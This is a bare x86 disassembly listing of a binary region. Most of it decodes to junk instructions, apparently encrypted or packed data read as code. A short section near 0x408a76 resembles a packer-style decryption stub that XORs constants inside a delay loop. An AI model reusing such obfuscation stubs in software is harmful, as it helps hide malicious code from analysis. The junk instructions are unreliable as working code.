  408801:	out    dx,al
  408802:	add    al,BYTE PTR [ecx+eiz*8]
  408805:	push   esp
  408806:	dec    edx
  408807:	jmp    0x40881b
  408809:	shl    BYTE PTR [ecx-0x6e3b6f8d],1
  40880f:	jle    0x40879c
  408811:	shl    DWORD PTR [esi-0x5d],1
  408814:	jne    0x4087c6
  408816:	push   0xfffffffa
  408818:	jb     0x40888e
  40881a:	jmp    0xc26e:0x86f44591
  408821:	push   ds
  408822:	jae    0x40887b
  408824:	dec    edx
  408825:	sub    eax,0xbc211f23
  40882a:	jb     0x40886e
  40882c:	hlt    
  40882d:	pop    ebx
  40882e:	sub    ebx,DWORD PTR [edi-0x58009186]
  408834:	cdq    
  408835:	call   0x3325:0x1f642c9
  40883c:	push   ebx
  40883d:	pop    ecx
  40883e:	xchg   edi,eax
  40883f:	test   eax,0x9f2938d1
  408844:	popa   
  408845:	inc    ebp
  408846:	pop    ebp
  408847:	shl    BYTE PTR [ebx-0x15f06567],0xba
  40884e:	xchg   bh,bl
  408850:	out    dx,al
  408851:	and    ecx,DWORD PTR [esi+0x4]
  408854:	sbb    eax,ebx
  408856:	loopne 0x408804
  408858:	jecxz  0x408864
  40885a:	adc    al,0x4e
  40885c:	pop    ss
  40885d:	es call 0x4f798e76
  408863:	ror    DWORD PTR [ebp+0x7253b2de],1
  408869:	dec    esp
  40886a:	sti    
  40886b:	pop    esi
  40886d:	ret    0xf257
  408870:	mov    ds:0xb8a33a10,al
  408875:	xlat   BYTE PTR ds:[ebx]
  408876:	cli    
  408877:	pop    edi
  408878:	sub    BYTE PTR [eax-0x3d8bdce1],dh
  40887e:	xor    al,0x26
  408880:	shr    DWORD PTR [ecx+0x7a],cl
  408883:	outs   dx,BYTE PTR ds:[esi]
  408884:	xchg   DWORD PTR [esi+edx*1+0x2d],ecx
  408888:	call   DWORD PTR [ebx+0x40]
  40888b:	jno    0x4088fa
  40888d:	clc    
  40888e:	or     ebx,DWORD PTR [edi]
  408890:	pop    esi
  408891:	xor    edi,DWORD PTR [edx+0x6438f217]
  408897:	fdivr  QWORD PTR [edx-0x5866f97f]
  40889d:	xchg   esp,eax
  40889e:	js     0x408880
  4088a0:	mov    cl,0xfa
  4088a2:	mov    ah,0xf0
  4088a4:	xchg   edx,eax
  4088a5:	icebp  
  4088a6:	cmp    eax,0xfffffff4
  4088a9:	push   ss
  4088aa:	(bad)  [ebp+0x33191c83]
  4088b0:	push   ebx
  4088b1:	inc    esi
  4088b2:	xor    DWORD PTR [ebx-0x55],esi
  4088b5:	mov    eax,ds:0x9fe9bc1f
  4088ba:	xchg   ecx,eax
  4088bb:	mov    ebx,0x14019649
  4088c0:	cs xchg esp,eax
  4088c2:	cmp    BYTE PTR [edx],dh
  4088c4:	mov    al,BYTE PTR [ebx]
  4088c6:	ja     0x4088e8
  4088c8:	imul   eax,DWORD PTR [edi+ebx*8+0x65],0xf85b57eb
  4088d0:	aad    0x92
  4088d2:	push   0x4a
  4088d4:	out    dx,al
  4088d5:	mov    esi,0xc6803560
  4088da:	cmp    DWORD PTR [ebp-0x6559a858],eax
  4088e0:	jge    0x408902
  4088e2:	xchg   edx,eax
  4088e3:	jns    0x4088b3
  4088e5:	nop
  4088e6:	fadd   st,st(5)
  4088e8:	aaa    
  4088e9:	add    bh,BYTE PTR [ebx+esi*1-0x78]
  4088ed:	mov    esi,0x720a7e1d
  4088f2:	inc    ebx
  4088f3:	mov    al,ds:0x3334468b
  4088f8:	and    ah,BYTE PTR [eax+0x17]
  4088fb:	repnz inc esi
  4088fd:	test   BYTE PTR [ebx],ah
  4088ff:	clc    
  408900:	pop    ss
  408901:	jne    0x4088e5
  408903:	sbb    DWORD PTR [eax],edi
  408905:	adc    BYTE PTR [eax+0x4769613c],ch
  40890b:	clc    
  40890c:	outs   dx,DWORD PTR ds:[esi]
  40890d:	pop    ebp
  40890e:	and    BYTE PTR [ecx-0x3],ch
  408911:	dec    ecx
  408912:	cdq    
  408913:	or     DWORD PTR [esi+0x2ddd1594],esi
  408919:	(bad)  
  40891a:	xchg   ecx,eax
  40891b:	ror    BYTE PTR [edi-0x471bfb17],cl
  408921:	mov    ah,0xe4
  408923:	xchg   ebp,eax
  408924:	mov    edi,0xb167a2dd
  408929:	call   0xbdab5d2c
  40892e:	(bad)  
  40892f:	sti    
  408930:	cmp    al,0xde
  408932:	sbb    al,0x30
  408934:	out    dx,eax
  408935:	aaa    
  408936:	cmp    edx,DWORD PTR [ebx]
  408938:	ror    DWORD PTR [edi],cl
  40893a:	mov    edx,0x2de3ffc1
  40893f:	pop    es
  408940:	or     esp,DWORD PTR cs:[esi-0x8083117]
  408947:	ret    
  408948:	inc    esi
  408949:	xor    BYTE PTR [eax],ah
  40894b:	mov    ebx,0xaf2f304b
  408950:	nop
  408951:	pop    ecx
  408952:	into   
  408953:	inc    eax
  408954:	jg     0x408904
  408956:	imul   esi,DWORD PTR [ebp+ebp*1+0x6040aba9],0x30
  40895e:	std    
  40895f:	retf   0xc23
  408962:	out    dx,al
  408963:	retf   0x62fd
  408966:	or     al,0x73
  408968:	sub    bl,dl
  40896a:	stc    
  40896b:	cli    
  40896c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40896d:	clc    
  40896e:	clc    
  40896f:	(bad)  
  408970:	shr    BYTE PTR ds:0xc5094560,cl
  408976:	div    DWORD PTR [edx-0x33]
  408979:	mov    ah,0x28
  40897b:	mov    ?,WORD PTR [edx*8+0x15f94091]
  408982:	adc    DWORD PTR [ebx-0x7a],ebx
  408985:	xor    eax,0x4387ac9a
  40898a:	sti    
  40898b:	shl    BYTE PTR ds:0x1dee08a2,0xe2
  408992:	stos   DWORD PTR es:[edi],eax
  408993:	ds pop eax
  408995:	inc    ecx
  408996:	push   esi
  408997:	int    0x8e
  408999:	(bad)  
  40899a:	das    
  40899b:	mov    eax,ds:0xce34f3ee
  4089a0:	mov    dl,0xcd
  4089a2:	inc    edx
  4089a3:	push   cs
  4089a4:	push   es
  4089a5:	mov    bl,0xb4
  4089a8:	push   ds
  4089a9:	rcl    DWORD PTR [esi+0x7d],cl
  4089ac:	xor    bl,BYTE PTR [eax-0xc]
  4089af:	jmp    0xa848:0x4f36ff7b
  4089b6:	rol    al,cl
  4089b8:	fsubr  QWORD PTR [ebx+0x37]
  4089bb:	dec    esi
  4089bc:	lea    esp,[edi+eax*8-0x22]
  4089c0:	inc    ecx
  4089c1:	icebp  
  4089c2:	xchg   esi,eax
  4089c3:	aam    0xf5
  4089c5:	add    cl,BYTE PTR [edx-0x29fe1dc9]
  4089cb:	cwde   
  4089cc:	mov    eax,0xceebae7b
  4089d1:	ret    0xbf57
  4089d4:	xchg   ebx,eax
  4089d5:	and    DWORD PTR [ebp+0x4e],esi
  4089d8:	sbb    BYTE PTR [ecx+0x4bf90b0a],bl
  4089de:	pop    esi
  4089df:	call   0x5532cbd4
  4089e4:	xchg   BYTE PTR [edi+0x17f2b1c8],bh
  4089ea:	(bad)  
  4089eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089ec:	sub    DWORD PTR [ebx-0x6f],ebp
  4089ef:	aaa    
  4089f0:	sbb    dh,BYTE PTR [ebx+0x5ed331fa]
  4089f6:	jmp    0x4089a0
  4089f8:	fsubr  QWORD PTR [ecx+edx*2]
  4089fb:	push   ecx
  4089fc:	and    ebx,edx
  4089fe:	and    eax,0x255a9a45
  408a03:	xchg   ebx,eax
  408a04:	mov    ah,BYTE PTR [ebx+0x61]
  408a07:	inc    DWORD PTR [edx]
  408a09:	es int3 
  408a0b:	ror    BYTE PTR [ecx+0x14],0x2a
  408a0f:	jns    0x4089c2
  408a11:	inc    eax
  408a12:	xor    DWORD PTR [edx+0x63bf45e6],0xafc835f7
  408a1c:	in     al,0xb8
  408a1e:	push   ecx
  408a1f:	or     al,0x17
  408a21:	lds    esi,FWORD PTR [edi+0x4090554b]
  408a27:	imul   edx,DWORD PTR [ebx+0x2e],0x8ef4245a
  408a2e:	outs   dx,DWORD PTR ds:[esi]
  408a2f:	cmp    bl,cl
  408a31:	int3   
  408a32:	popf   
  408a33:	iret   
  408a34:	dec    esp
  408a35:	ficom  DWORD PTR [esp+edi*8+0x552db980]
  408a3c:	push   esi
  408a3d:	into   
  408a3e:	mov    dh,0xd3
  408a40:	push   es
  408a41:	push   eax
  408a42:	shl    BYTE PTR [edx-0x3c9d3e29],0x86
  408a49:	cs fs mov ch,dh
  408a4d:	push   ss
  408a4e:	repz adc edx,ebp
  408a51:	in     eax,0xeb
  408a53:	fbld   TBYTE PTR [edi-0x1d97bf56]
  408a59:	push   eax
  408a5a:	jp     0x408a2f
  408a5c:	scas   al,BYTE PTR es:[edi]
  408a5d:	and    edi,0x68b24e1d
  408a63:	pop    es
  408a64:	mov    ah,0x54
  408a66:	dec    ebx
  408a67:	adc    esp,DWORD PTR [esi+0x6f]
  408a6a:	addr16 es mov edx,0x189b4cb
  408a71:	pop    esi
  408a72:	leave  
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0x64b3a4f9
  408a92:	test   al,0x7e
  408a94:	dec    ebx
  408a95:	cmp    ah,ah
  408a97:	js     0x408b11
  408a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9a:	jle    0x408b14
  408a9c:	js     0x408a3d
  408a9e:	sbb    eax,0x5a9ae97a
  408aa3:	sbb    ecx,esp
  408aa5:	jno    0x408b04
  408aa7:	mov    cl,0xb2
  408aa9:	inc    ebx
  408aaa:	jle    0x408ae5
  408aac:	fdiv   st,st(1)
  408aae:	retf   0x1143
  408ab1:	mov    ch,0xb0
  408ab3:	dec    edi
  408ab4:	popf   
  408ab5:	icebp  
  408ab6:	test   eax,0xee433312
  408abb:	mov    al,BYTE PTR [ebp-0x43f02def]
  408ac1:	pop    esi
  408ac2:	pop    ebx
  408ac3:	jmp    0xe07703fe
  408ac8:	sub    al,0xab
  408aca:	add    eax,0x4032ecdc
  408acf:	jmp    0x6f1f5fc3
  408ad4:	inc    ecx
  408ad5:	inc    edi
  408ad6:	and    eax,0xa2f96df2
  408adb:	jae    0x408b1d
  408add:	sbb    ecx,DWORD PTR [edi+0x57a3323f]
  408ae3:	push   0x8c60ded
  408ae8:	jb     0x408b0c
  408aea:	gs aam 0xf1
  408aed:	and    al,0x6f
  408aef:	push   ebx
  408af0:	mov    ds,WORD PTR [ebx]
  408af2:	ins    DWORD PTR es:[edi],dx
  408af3:	sbb    edx,DWORD PTR [eax]
  408af5:	cdq    
  408af6:	ins    BYTE PTR es:[edi],dx
  408af7:	dec    eax
  408af8:	add    DWORD PTR [esi+0x3c8e9d78],0xd571b585
  408b02:	and    DWORD PTR [edx+0xa332b5],esi
  408b08:	lds    ebp,FWORD PTR [edx+0x7e]
  408b0b:	pop    edi
  408b0d:	sbb    edi,DWORD PTR [ebx+0x3b09f9b5]
  408b13:	push   edi
  408b14:	retf   0x37f
  408b17:	pushf  
  408b18:	mov    WORD PTR [ecx],gs
  408b1a:	dec    ebx
  408b1b:	gs mov ebx,0x243a2f2d
  408b21:	sbb    ebp,DWORD PTR ds:0xf955ef9d
  408b27:	jecxz  0x408b74
  408b29:	enter  0xee23,0xbb
  408b2d:	jge    0x408af0
  408b2f:	jae    0x408b0e
  408b31:	int    0x30
  408b33:	sbb    al,al
  408b35:	lea    edi,[ecx-0x74]
  408b38:	nop
  408b39:	xchg   bh,dl
  408b3b:	xor    edi,DWORD PTR [ebx]
  408b3d:	mov    WORD PTR [bx-0x5f],?
  408b41:	mov    bl,0x82
  408b43:	outs   dx,DWORD PTR ds:[esi]
  408b44:	adc    dh,bl
  408b46:	call   0x5830b854
  408b4b:	popf   
  408b4c:	int3   
  408b4d:	jno    0x408bbf
  408b4f:	inc    edi
  408b50:	nop
  408b51:	inc    eax
  408b52:	and    bl,ah
  408b54:	mov    bh,0x63
  408b56:	pop    edi
  408b57:	dec    ebp
  408b58:	loopne 0x408b63
  408b5a:	int    0x77
  408b5c:	pop    esp
  408b5d:	lea    edi,[edx+0xd]
  408b60:	and    al,0xcd
  408b62:	lods   eax,DWORD PTR ds:[esi]
  408b63:	mov    dh,0xa2
  408b65:	retf   
  408b66:	xchg   edx,eax
  408b67:	repnz mov esp,0x5da2a243
  408b6d:	push   ebx
  408b6e:	fstp   TBYTE PTR [eax+0x12]
  408b71:	ins    BYTE PTR es:[edi],dx
  408b72:	call   0x5ef4:0x88ad8422
  408b79:	loopne 0x408bcc
  408b7b:	cmp    BYTE PTR [ebp+0x51],0x9d
  408b7f:	xchg   edx,eax
  408b80:	inc    edx
  408b81:	fild   DWORD PTR gs:[edx]
  408b84:	pop    esp
  408b85:	leave  
  408b86:	pop    ss
  408b87:	xchg   edx,eax
  408b88:	pop    edi
  408b89:	and    al,0x6a
  408b8b:	in     eax,0x9c
  408b8d:	imul   ecx,DWORD PTR gs:0x8d72c5b0,0x43
  408b95:	out    dx,eax
  408b96:	sbb    bl,BYTE PTR [esi-0x4f]
  408b99:	or     eax,0x6a7a399d
  408b9e:	bound  ecx,QWORD PTR [ebp-0x47d3e8c7]
  408ba4:	repnz mov edx,0x735d65e6
  408baa:	ins    BYTE PTR es:[edi],dx
  408bab:	push   ds
  408bac:	mov    ds:0xf4cace0a,eax
  408bb1:	imul   esi,DWORD PTR [ecx+0x2c],0x14c8a7dd
  408bb8:	add    cl,BYTE PTR [ebp-0x56b817e6]
  408bbe:	js     0x408c03
  408bc0:	imul   ebp,DWORD PTR [esi-0x27],0x51ec635e
  408bc7:	sub    BYTE PTR [ebx-0x10],0x9e
  408bcb:	add    eax,0x49c780de
  408bd0:	pop    ebx
  408bd1:	adc    cl,ah
  408bd3:	xor    eax,0x1159f791
  408bd8:	lea    esp,cs:[edi+0xeee119d]
  408bdf:	mov    eax,ds:0xf481f0cc
  408be4:	jge    0x408b69
  408be6:	sbb    eax,0x67100134
  408beb:	ja     0x408c1d
  408bed:	pop    ecx
  408bee:	and    al,0x2b
  408bf0:	test   al,0x68
  408bf2:	enter  0xded5,0x88
  408bf6:	add    al,0x98
  408bf8:	mov    gs,WORD PTR [ebx-0x7eeb8e8e]
  408bfe:	mov    bh,0xad
  408c00:	cmp    DWORD PTR [ecx+0x7a9ffff3],esp
  408c06:	lods   eax,DWORD PTR ds:[esi]
  408c07:	push   DWORD PTR [ecx-0x3c589d83]
  408c0d:	push   edi
  408c0e:	wbinvd 
  408c10:	xlat   BYTE PTR ds:[ebx]
  408c11:	and    DWORD PTR [ebx-0x981d05e],esp
  408c17:	or     ecx,ebx
  408c19:	dec    ebx
  408c1a:	ins    DWORD PTR es:[edi],dx
  408c1b:	pop    edi
  408c1c:	test   eax,0xf09d9c6e
  408c21:	adc    eax,0x1d7742c7
  408c26:	xor    al,0x8f
  408c28:	fimul  DWORD PTR [eax+0x6b99a965]
  408c2e:	mov    ecx,0x36df9f0d
  408c33:	cmp    eax,0x19e5d43f
  408c38:	pop    ebx
  408c39:	inc    BYTE PTR [ecx]
  408c3b:	xor    BYTE PTR [eax+0x29],ah
  408c3e:	jp     0x408c0d
  408c40:	out    0xc4,eax
  408c42:	mov    edi,0xee5e194a
  408c47:	(bad)  
  408c49:	mov    ebx,0x7296ade4
  408c4e:	inc    esi
  408c4f:	gs cmc 
  408c51:	sub    DWORD PTR [eax-0x53],esp
  408c54:	add    esp,esp
  408c56:	mov    dh,0x98
  408c58:	jb     0x408c79
  408c5a:	xchg   BYTE PTR [ebx],ah
  408c5c:	inc    ecx
  408c5d:	loopne 0x408ca3
  408c5f:	jmp    0x990186d0
  408c64:	and    BYTE PTR [edx+0x4],bl
  408c67:	jecxz  0x408c8c
  408c69:	mov    ss,esi
  408c6b:	call   0x68b48681
  408c70:	lahf   
  408c71:	cmp    BYTE PTR [edx-0x8a5bdf7],dh
  408c77:	sub    dh,al
  408c79:	in     al,0xa2
  408c7b:	mov    ecx,0xb9ab52a3
  408c80:	adc    eax,0xe5a701c7
  408c85:	fild   DWORD PTR [esi]
  408c87:	mov    bh,0xa2
  408c89:	or     BYTE PTR [ecx],ch
  408c8b:	repz push cs
  408c8d:	xchg   esp,eax
  408c8f:	xchg   ecx,eax
  408c90:	sub    ch,BYTE PTR [ecx]
  408c92:	pop    ds
  408c93:	or     eax,0x899079e3
  408c98:	xchg   DWORD PTR [edx+ecx*8-0x4d],ebp
  408c9c:	cs xchg ebp,eax
  408c9e:	or     al,0x19
  408ca0:	cli    
  408ca1:	mov    ch,0x4d
  408ca3:	imul   esp,DWORD PTR [edi+eiz*2],0x7ad2b2ac
  408caa:	mov    esp,0x3430a2b
  408caf:	jmp    0x408c50
  408cb1:	nop
  408cb2:	pop    ecx
  408cb3:	xor    al,0x84
  408cb5:	ficomp DWORD PTR [ebx]
  408cb7:	dec    esi
  408cb8:	call   0x7c2c5104
  408cbd:	int    0xfc
  408cbf:	inc    edx
  408cc0:	dec    ebp
  408cc1:	push   esp
  408cc2:	rol    BYTE PTR [ebp+0x44],0x58
  408cc6:	popf   
  408cc7:	xchg   ebp,eax
  408cc8:	fcomi  st,st(6)
  408cca:	jnp    0x408cec
  408ccc:	nop
  408ccd:	frstor [edi+0x7bd273ac]
  408cd3:	data16 cld 
  408cd5:	dec    ebp
  408cd6:	popf   
  408cd7:	push   ss
  408cd8:	xor    edi,esi
  408cda:	shl    DWORD PTR [eax-0x57],0xd3
  408cde:	repz out 0x82,al
  408ce1:	les    ebp,FWORD PTR [ebp-0x1f]
  408ce4:	xchg   ebp,eax
  408ce5:	dec    ebp
  408ce6:	jmp    0x209e:0x26a0111d
  408ced:	mov    ds:0xc777abd8,eax
  408cf2:	adc    eax,0x38ddfa45
  408cf7:	in     eax,0xad
  408cf9:	add    ebx,DWORD PTR [ecx-0x60]
  408cfc:	cmp    DWORD PTR [esi-0x2e847a59],edx
  408d02:	xchg   edx,eax
  408d03:	fisubr DWORD PTR [ebp+edi*4-0x1]
  408d07:	dec    esp
  408d08:	loopne 0x408c96
  408d0a:	sub    dh,BYTE PTR [ebp+0x79]
  408d0d:	lock xchg esp,eax
  408d0f:	push   ecx
  408d10:	int3   
  408d11:	rol    BYTE PTR [edx-0x3ff3812d],1
  408d17:	les    eax,FWORD PTR [edx+ebp*2-0x17e1bce0]
  408d1e:	int    0xf7
  408d20:	rcl    bl,0xb8
  408d23:	arpl   WORD PTR [ecx+0x52],cx
  408d26:	pop    eax
  408d27:	mov    dh,0xfc
  408d29:	out    dx,al
  408d2a:	sub    al,0xdc
  408d2c:	ins    DWORD PTR es:[edi],dx
  408d2d:	sbb    edi,DWORD PTR [esp+ecx*4]
  408d30:	lock sahf 
  408d32:	xchg   BYTE PTR [esi-0x55],bh
  408d35:	cmp    DWORD PTR [ebx-0x38081135],0x5309c4b6
  408d3f:	and    ebp,DWORD PTR [esi-0x11d96f5c]
  408d45:	pop    ecx
  408d46:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  408d4d:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  408d54:	mov    eax,DWORD PTR [ebp-0x4]
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42aacd
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42aaed,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42aa21,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42aa21
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42aa21,ecx
  408d90:	cmp    DWORD PTR ds:0x42aa21,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42aa21,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42aa21,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42aa21
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42aa21,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42aa55
  408ddc:	xor    ecx,DWORD PTR ds:0x42aa1d
  408de2:	mov    DWORD PTR ds:0x42aa55,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42aa69,0x42a9c5
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a9dd,0x42aa59
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0xffffffd0
  408e1d:	sub    BYTE PTR ds:0x78ea67de,al
  408e23:	js     0x408dcc
  408e25:	jle    0x408e9f
  408e27:	js     0x408e4d
  408e29:	lods   al,BYTE PTR ds:[esi]
  408e2a:	add    DWORD PTR [ebp+0x408af738],esp
  408e30:	mov    eax,0x58f0df02
  408e35:	mov    edi,DWORD PTR [eax-0x75]
  408e38:	cli    
  408e39:	dec    edx
  408e3a:	popa   
  408e3b:	int    0xb6
  408e3d:	fdiv   st,st(6)
  408e3f:	das    
  408e40:	rcl    ecx,1
  408e42:	pop    esp
  408e43:	cmp    al,0x22
  408e45:	aad    0x7c
  408e47:	or     ecx,DWORD PTR [ecx-0x50]
  408e4a:	dec    esp
  408e4b:	cmp    BYTE PTR [ebp-0x642c1ecc],dl
  408e51:	les    esi,FWORD PTR [ebx]
  408e53:	cmp    dh,ch
  408e55:	pop    ebp
  408e56:	xchg   esi,eax
  408e57:	mov    ds:0x5f0c5163,al
  408e5c:	jmp    FWORD PTR [ebx-0x5bceac9f]
  408e62:	jle    0x408eb9
  408e64:	mov    dh,0x3
  408e66:	mov    edx,0xa63bc282
  408e6b:	sbb    eax,DWORD PTR [edi-0x2b]
  408e6e:	ja     0x408ed1
  408e70:	loope  0x408df6
  408e72:	mov    ah,BYTE PTR [ebp+0x7b182ee6]
  408e78:	fild   DWORD PTR [edx+ebx*8-0x3e]
  408e7c:	xchg   esp,eax
  408e7d:	je     0x408e76
  408e7f:	jle    0x408e96
  408e81:	loop   0x408e56
  408e83:	arpl   sp,cx
  408e85:	pop    ecx
  408e86:	and    dl,bl
  408e88:	aad    0xbb
  408e8a:	in     eax,0xdd
  408e8c:	jl     0x408eba
  408e8e:	xchg   edi,eax
  408e8f:	jp     0x408e15
  408e91:	sub    al,0xc5
  408e93:	cld    
  408e94:	xchg   esp,eax
  408e95:	fwait
  408e96:	ret    
  408e97:	pop    esi
  408e98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e99:	ds sub ax,0x1cf7
  408e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e9f:	(bad)  
  408ea0:	into   
  408ea1:	ds inc esp
  408ea3:	mov    bl,0x1b
  408ea5:	enter  0x435d,0x46
  408ea9:	and    DWORD PTR [esi-0x77],ecx
  408eac:	(bad)  
  408ead:	cmp    esp,edi
  408eaf:	out    0xe3,eax
  408eb1:	mul    eax
  408eb3:	pop    ebp
  408eb4:	out    0x56,eax
  408eb6:	mov    eax,ds:0xc6276893
  408ebb:	pop    ss
  408ebc:	jp     0x408f36
  408ebe:	scas   eax,DWORD PTR es:[edi]
  408ebf:	sbb    al,0x8d
  408ec1:	mov    ebp,0x57d95ca9
  408ec6:	sbb    BYTE PTR ds:0x7c979502,ah
  408ecc:	lods   eax,DWORD PTR ds:[esi]
  408ecd:	mov    ecx,0xf4820756
  408ed2:	mov    eax,ds:0xc96c0e4d
  408ed7:	js     0x408e86
  408ed9:	mov    edx,0x5f103911
  408ede:	inc    eax
  408edf:	jbe    0x408f07
  408ee1:	inc    esp
  408ee2:	cpuid  
  408ee4:	es retf 0x300
  408ee8:	adc    ebp,DWORD PTR [ebp-0x3affa0d8]
  408eee:	xchg   BYTE PTR [ebx+eiz*1-0x61],al
  408ef2:	push   esi
  408ef3:	cli    
  408ef4:	inc    ebx
  408ef5:	inc    eax
  408ef6:	lds    esi,FWORD PTR [esi+edx*1]
  408ef9:	sbb    BYTE PTR [ecx],al
  408efb:	cs pop es
  408efd:	push   ecx
  408efe:	mov    ds,WORD PTR [edx+0x7060bf97]
  408f04:	inc    esp
  408f05:	pop    esi
  408f06:	jb     0x408ead
  408f08:	and    eax,0x91c6e7a5
  408f0d:	xchg   ebp,eax
  408f0e:	push   0xf90719b7
  408f13:	cs mov esi,0xa4c92007
  408f19:	mov    al,ds:0x7d6106a5
  408f1e:	inc    ebp
  408f1f:	cmp    DWORD PTR [ebx],esi
  408f21:	test   BYTE PTR [edx-0x7f017b09],0x18
  408f28:	sbb    eax,0xbdfb495f
  408f2d:	loopne 0x408f10
  408f2f:	cmp    esp,DWORD PTR [ebp+0xaa09821]
  408f35:	aaa    
  408f36:	sub    eax,0x5b0474c8
  408f3b:	(bad)  [eax+0x1]
  408f3e:	in     eax,0x77
  408f40:	daa    
  408f41:	dec    edx
  408f42:	rol    BYTE PTR [ebx+0x24],cl
  408f45:	int    0x49
  408f47:	mov    DWORD PTR [edi],0x44d9252b
  408f4d:	or     eax,0xff93d17b
  408f52:	add    eax,0x6c4e9ece
  408f57:	xor    al,BYTE PTR ds:0x3b9f93fb
  408f5d:	out    dx,al
  408f5e:	xchg   esi,eax
  408f5f:	iret   
  408f60:	push   esp
  408f61:	sub    eax,DWORD PTR [eax-0x6af5b293]
  408f67:	and    BYTE PTR [edi+0x3d],bl
  408f6a:	loop   0x408efe
  408f6c:	pop    es
  408f6d:	dec    ebp
  408f6e:	push   esp
  408f6f:	lock mul al
  408f72:	jle    0x408fb3
  408f74:	xor    ebx,edi
  408f76:	cmp    BYTE PTR [edx-0x14],0xb
  408f7a:	lds    ecx,FWORD PTR [esi]
  408f7c:	sub    dl,bl
  408f7e:	add    eax,0x28f58bbb
  408f83:	sub    ebx,esi
  408f85:	xchg   DWORD PTR [edx+0x6d238671],ebp
  408f8b:	aad    0x54
  408f8d:	push   esp
  408f8e:	mov    ebp,0xb25a1c4d
  408f93:	mov    ebx,0xddb0e802
  408f98:	adc    esp,DWORD PTR [ecx+0x4d4a0ec7]
  408f9e:	arpl   WORD PTR [esi+0x12],ax
  408fa1:	jmp    0x4d912c64
  408fa6:	sbb    dh,BYTE PTR [edi]
  408fa8:	repz xor al,dl
  408fab:	neg    BYTE PTR [ebp+0x74]
  408fae:	cmp    eax,0xa4951b95
  408fb3:	dec    edi
  408fb4:	pop    edx
  408fb5:	sbb    BYTE PTR [ecx+edi*8+0x9],ah
  408fb9:	dec    ecx
  408fba:	shr    BYTE PTR [edi-0x7],1
  408fbd:	mov    edx,0xca8669ca
  408fc2:	repz icebp 
  408fc4:	jmp    0xd59ddc39
  408fc9:	ins    DWORD PTR es:[edi],dx
  408fca:	rcr    DWORD PTR [eax+ecx*1],0xcf
  408fce:	mov    ds:0x94b1bfa2,eax
  408fd3:	in     al,dx
  408fd4:	mov    ecx,ebx
  408fd6:	inc    esp
  408fd7:	daa    
  408fd8:	ror    BYTE PTR [eax+edx*1+0x27],cl
  408fdc:	inc    ebx
  408fdd:	and    eax,0xe5e8a999
  408fe2:	adc    ecx,DWORD PTR [ecx-0x4]
  408fe5:	ret    
  408fe6:	mov    ecx,0xeef057b3
  408feb:	icebp  
  408fec:	out    dx,eax
  408fed:	inc    esi
  408fee:	adc    DWORD PTR [ebp-0x10],ecx
  408ff1:	dec    dx
  408ff3:	push   ss
  408ff4:	jno    0x409043
  408ff6:	aaa    
  408ff7:	(bad)  
  408ff8:	cmp    al,0x93
  408ffa:	push   0xab408020
  408fff:	test   BYTE PTR [ecx-0x4b],dl
  409002:	data16 jbe 0x40906e
  409005:	add    edx,DWORD PTR [eax]
  409007:	dec    ebp
  409008:	pop    ss
  409009:	sbb    al,0x2d
  40900b:	iret   
  40900c:	dec    edi
  40900d:	pop    es
  40900e:	loop   0x408fdc
  409010:	dec    edx
  409011:	cmp    bh,BYTE PTR [edx]
  409013:	xor    ecx,DWORD PTR [ebp-0x25]
  409016:	loope  0x40904c
  409018:	hlt    
  409019:	ds pushf 
  40901b:	xchg   ebp,eax
  40901c:	mov    ?,WORD PTR [edx]
  40901e:	adc    DWORD PTR [ebx],ecx
  409020:	test   al,0xee
  409022:	or     bl,BYTE PTR [edx-0x230f5086]
  409028:	test   edx,esp
  40902a:	pusha  
  40902b:	or     DWORD PTR [edx+0xb],0x37
  40902f:	call   0x227b:0xe811db0b
  409036:	mov    eax,ds:0xb049af66
  40903b:	pushf  
  40903c:	call   DWORD PTR [edx+0x56]
  40903f:	add    eax,0x71b125cd
  409044:	outs   dx,BYTE PTR ds:[esi]
  409045:	adc    BYTE PTR ds:0x37b5ab15,0x91
  40904c:	jg     0x408fde
  40904e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40904f:	sbb    ebp,DWORD PTR [edx+edx*1+0xbf5544e]
  409056:	push   0xdf70bcca
  40905b:	pusha  
  40905c:	outs   dx,DWORD PTR ds:[esi]
  40905d:	icebp  
  40905e:	(bad)  
  40905f:	cmp    esp,edi
  409061:	js     0x40905b
  409063:	mov    edi,esp
  409065:	cwde   
  409066:	pop    edi
